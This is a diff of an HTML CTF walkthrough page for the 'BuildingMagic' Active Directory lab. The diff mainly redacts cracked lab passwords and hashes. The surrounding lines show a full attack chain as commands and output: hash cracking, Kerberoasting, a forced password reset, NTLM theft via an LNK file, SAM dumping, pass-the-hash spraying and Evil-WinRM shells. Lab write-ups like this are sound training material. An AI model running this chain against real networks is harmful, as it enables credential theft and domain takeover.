@@ -10,7 +10,7 @@
   <meta property="og:title" content="BuildingMagic CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
   <meta property="og:description" content="Complete AD penetration testing walkthrough covering password cracking, Kerberoasting, NTLM theft, SeBackupPrivilege abuse, and Pass-the-Hash for domain compromise on Windows Server 2022." />
   <meta property="og:image" content="https://z3rotrace.live/assets/buildingmagic/bloodhound-domain-admin.png" />
-  <meta property="og:url" content="https://z3rotrace.live/walkthroughs/buildingmagic.html" />
+  <meta property="og:url" content="https://z3rotrace.live/HackSmarter/buildingmagic.html" />
   <meta property="og:type" content="article" />
 
   <!-- Twitter Card tags -->
@@ -178,16 +178,16 @@
         </ul>
       </li>
       <li class="has-submenu">
-        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Machines Walkthroughs</button>
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>HackSmarter Labs</button>
         <ul class="submenu">
-          <li><a href="welcome.html">Welcome - ADCS ESC1</a></li>
-          <li><a href="staged.html">Staged - HackSmarter Labs</a></li>
-          <li><a href="buildingmagic.html" aria-current="page">BuildingMagic - HackSmarter Labs</a></li>
-          <li><a href="arasaka.html">Arasaka - HackSmarter Labs</a></li>
-          <li><a href="midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
-          <li><a href="banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
-          <li><a href="ascension.html">Ascension - HackSmarter Labs</a></li>
-          <li><a href="slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="welcome.html">Welcome</a></li>
+          <li><a href="staged.html">Staged</a></li>
+          <li><a href="buildingmagic.html" aria-current="page">BuildingMagic</a></li>
+          <li><a href="arasaka.html">Arasaka</a></li>
+          <li><a href="midgarden2-badsuccessor.html">Midgarden2</a></li>
+          <li><a href="banksmarter.html">BankSmarter</a></li>
+          <li><a href="ascension.html">Ascension</a></li>
+          <li><a href="slayer.html">Slayer</a></li>
           <li><a href="anomaly.html">Anomaly</a></li>
           <li><a href="sharethepain.html">ShareThePain</a></li>
           <li><a href="sysco.html">Sysco</a></li>
@@ -263,22 +263,22 @@
 
   <p>For hashes that CrackStation missed, I used hashcat with rockyou.txt:</p>
   <pre><code>$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --show
-c4a21c4d438819d73d24851e7966229c:lilronron</code></pre>
+[REDACTED]:[REDACTED]</code></pre>
 
   <div class="note">
     <strong>What is hashcat -m 0?</strong> The <code>-m</code> flag in hashcat specifies the hash type. Mode <code>0</code> is for raw MD5 hashes. The <code>--show</code> flag displays already-cracked hashes from hashcat's potfile.
   </div>
 
   <div class="key-finding">
-    <strong>Validated Credentials:</strong> <code>t.ren:shadowhex7</code> and <code>r.widdleton:lilronron</code>
+    <strong>Validated Credentials:</strong> <code>t.ren:[REDACTED]</code> and <code>r.widdleton:[REDACTED]</code>
   </div>
 
   <h2>Initial Access</h2>
 
   <h3><span class="step">[Step 3]</span> Credential Validation</h3>
   <p>I validated the credentials using NetExec. Only <code>r.widdleton</code> had valid access:</p>
-  <pre><code>$ nxc smb 10.1.167.230 -u r.widdleton -p lilronron
-SMB   10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron</code></pre>
+  <pre><code>$ nxc smb 10.1.167.230 -u r.widdleton -p [REDACTED]
+SMB   10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\r.widdleton:[REDACTED]</code></pre>
 
   <p><img src="../assets/buildingmagic/nxc-smb-validation.png" alt="NetExec SMB validation showing r.widdleton successful login" loading="lazy"></p>
 
@@ -305,7 +305,7 @@ SMB   10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron</co
 
   <h3><span class="step">[Step 5]</span> Kerberoasting r.haggard</h3>
   <p>I used NetExec to perform the Kerberoasting attack:</p>
-  <pre><code>$ nxc ldap 10.1.167.230 -u r.widdleton -p lilronron --kerberoast output.txt</code></pre>
+  <pre><code>$ nxc ldap 10.1.167.230 -u r.widdleton -p [REDACTED] --kerberoast output.txt</code></pre>
 
   <p><img src="../assets/buildingmagic/nxc-kerberoasting.png" alt="NetExec Kerberoasting output capturing TGS hash for r.haggard" loading="lazy"></p>
 
@@ -339,14 +339,14 @@ LDAP  10.1.167.230  389  DC01  [+] BUILDINGMAGIC.LOCAL\r.haggard:rubeushagrid</c
   </div>
 
   <p>I used <code>net rpc</code> to change h.potch's password:</p>
-  <pre><code>$ net rpc password 'h.potch' 'Zerotrace123@' -U 'BUILDINGMAGIC.LOCAL'/'r.haggard'%'rubeushagrid' -S DC01.BUILDINGMAGIC.LOCAL</code></pre>
+  <pre><code>$ net rpc password 'h.potch' '[REDACTED]' -U 'BUILDINGMAGIC.LOCAL'/'r.haggard'%'rubeushagrid' -S DC01.BUILDINGMAGIC.LOCAL</code></pre>
 
   <p>Validated the new credentials:</p>
-  <pre><code>$ nxc smb 10.1.167.230 -u h.potch -p 'Zerotrace123@'
-SMB  10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\h.potch:Zerotrace123@</code></pre>
+  <pre><code>$ nxc smb 10.1.167.230 -u h.potch -p '[REDACTED]'
+SMB  10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\h.potch:[REDACTED]</code></pre>
 
   <div class="key-finding">
-    <strong>New Credentials:</strong> <code>h.potch:Zerotrace123@</code>
+    <strong>New Credentials:</strong> <code>h.potch:[REDACTED]</code>
   </div>
 
   <h3><span class="step">[Step 8]</span> NTLM Hash Capture via Malicious LNK File</h3>
@@ -381,18 +381,18 @@ putting file meeting.lnk as \meeting.lnk (5.1 kB/s) (average 5.1 kB/s)</code></p
   <p><img src="../assets/buildingmagic/responder-ntlmv2-capture.png" alt="Responder capturing NTLMv2 hash for h.grangon" loading="lazy"></p>
 
   <p>A user browsed to the share, and I captured their NTLMv2 hash:</p>
-  <pre><code>H.GRANGON::BUILDINGMAGIC:a746324b2edec74a:0f571e485de3f42e087987ab223c48b0:...</code></pre>
+  <pre><code>H.GRANGON::BUILDINGMAGIC:a746324b2edec74a:[REDACTED]:...</code></pre>
 
   <h3><span class="step">[Step 9]</span> Cracking the NTLMv2 Hash</h3>
   <pre><code>$ hashcat -m 5600 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt
-H.GRANGON::BUILDINGMAGIC:...:magic4ever</code></pre>
+H.GRANGON::BUILDINGMAGIC:...:[REDACTED]</code></pre>
 
   <div class="note">
     <strong>What is hashcat -m 5600?</strong> Mode <code>5600</code> is for NTLMv2 hashes (NetNTLMv2). These are network authentication hashes captured during NTLM relay or theft attacks, different from the NT hashes stored in SAM/NTDS.
   </div>
 
   <div class="key-finding">
-    <strong>New Credentials:</strong> <code>h.grangon:magic4ever</code>
+    <strong>New Credentials:</strong> <code>h.grangon:[REDACTED]</code>
   </div>
 
   <p><img src="../assets/buildingmagic/nxc-hgrangon-validation.png" alt="NetExec validating h.grangon credentials" loading="lazy"></p>
@@ -412,7 +412,7 @@ H.GRANGON::BUILDINGMAGIC:...:magic4ever</code></pre>
   </div>
 
   <p>I connected via Evil-WinRM:</p>
-  <pre><code>$ evil-winrm -i 10.1.167.230 -u 'h.grangon' -p 'magic4ever'
+  <pre><code>$ evil-winrm -i 10.1.167.230 -u 'h.grangon' -p '[REDACTED]'
 
 Evil-WinRM shell v3.7
 *Evil-WinRM* PS C:\Users\h.grangon\Documents></code></pre>
@@ -462,11 +462,11 @@ Info: Download successful!</code></pre>
   <h3><span class="step">[Step 12]</span> Extracting Local Hashes</h3>
   <p>Using <code>secretsdump.py</code> from Impacket, I extracted the local account hashes:</p>
   <pre><code>$ secretsdump.py -system system.save -sam sam.save LOCAL
-[*] Target system bootKey: 0xf61a94fb13f74350a1f87f509c8c455c
+[*] Target system bootKey: 0x[REDACTED]
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code></pre>
+Administrator:500:[REDACTED]:[REDACTED]:::
+Guest:501:[REDACTED]:[REDACTED]:::
+DefaultAccount:503:[REDACTED]:[REDACTED]:::</code></pre>
 
   <div class="note">
     <strong>What is secretsdump.py?</strong> Part of the Impacket toolkit, secretsdump.py extracts password hashes from SAM/SYSTEM registry hives, NTDS.dit files, or remotely via DCSync. The <code>LOCAL</code> parameter indicates offline extraction from dumped files.
@@ -474,7 +474,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 
   <h3><span class="step">[Step 13]</span> Password Spraying with Hash</h3>
   <p>I enumerated domain users:</p>
-  <pre><code>$ nxc smb 10.1.167.230 -u 'h.grangon' -p 'magic4ever' --users
+  <pre><code>$ nxc smb 10.1.167.230 -u 'h.grangon' -p '[REDACTED]' --users
 SMB  10.1.167.230  445  DC01  Administrator
 SMB  10.1.167.230  445  DC01  h.potch
 SMB  10.1.167.230  445  DC01  r.widdleton
@@ -483,8 +483,8 @@ SMB  10.1.167.230  445  DC01  h.grangon
 SMB  10.1.167.230  445  DC01  a.flatch</code></pre>
 
   <p>I created a user list and performed a pass-the-hash attack:</p>
-  <pre><code>$ nxc smb 10.1.167.230 -u user.list -H 520126a03f5d5a8d836f1c4f34ede7ce --continue-on-success
-SMB  10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\a.flatch:520126a03f5d5a8d836f1c4f34ede7ce</code></pre>
+  <pre><code>$ nxc smb 10.1.167.230 -u user.list -H [REDACTED] --continue-on-success
+SMB  10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\a.flatch:[REDACTED]</code></pre>
 
   <p><img src="../assets/buildingmagic/nxc-hash-spray.png" alt="NetExec password spraying with hash showing a.flatch as valid" loading="lazy"></p>
 
@@ -508,7 +508,7 @@ SMB  10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\a.flatch:520126a03f5d5a8d8
 
   <h3><span class="step">[Step 15]</span> Administrator Shell</h3>
   <p>I connected as <code>a.flatch</code> using Evil-WinRM with the hash:</p>
-  <pre><code>$ evil-winrm -u a.flatch -H 520126a03f5d5a8d836f1c4f34ede7ce -i 10.1.167.230</code></pre>
+  <pre><code>$ evil-winrm -u a.flatch -H [REDACTED] -i 10.1.167.230</code></pre>
 
   <p><img src="../assets/buildingmagic/evil-winrm-root.png" alt="Evil-WinRM shell as a.flatch reading root flag" loading="lazy"></p>
 
@@ -561,12 +561,12 @@ Domain Compromise</code></pre>
     <tbody>
       <tr>
         <td>r.widdleton</td>
-        <td><code>lilronron</code></td>
+        <td><code>[REDACTED]</code></td>
         <td>MD5 crack</td>
       </tr>
       <tr>
         <td>t.ren</td>
-        <td><code>shadowhex7</code></td>
+        <td><code>[REDACTED]</code></td>
         <td>MD5 crack (not valid for domain)</td>
       </tr>
       <tr>
@@ -576,17 +576,17 @@ Domain Compromise</code></pre>
       </tr>
       <tr>
         <td>h.potch</td>
-        <td><code>Zerotrace123@</code></td>
+        <td><code>[REDACTED]</code></td>
         <td>ForceChangePassword abuse</td>
       </tr>
       <tr>
         <td>h.grangon</td>
-        <td><code>magic4ever</code></td>
+        <td><code>[REDACTED]</code></td>
         <td>NTLM theft + NTLMv2 crack</td>
       </tr>
       <tr>
         <td>a.flatch</td>
-        <td><code>520126a03f5d5a8d836f1c4f34ede7ce</code></td>
+        <td><code>[REDACTED]</code></td>
         <td>SAM dump + password reuse</td>
       </tr>
     </tbody>
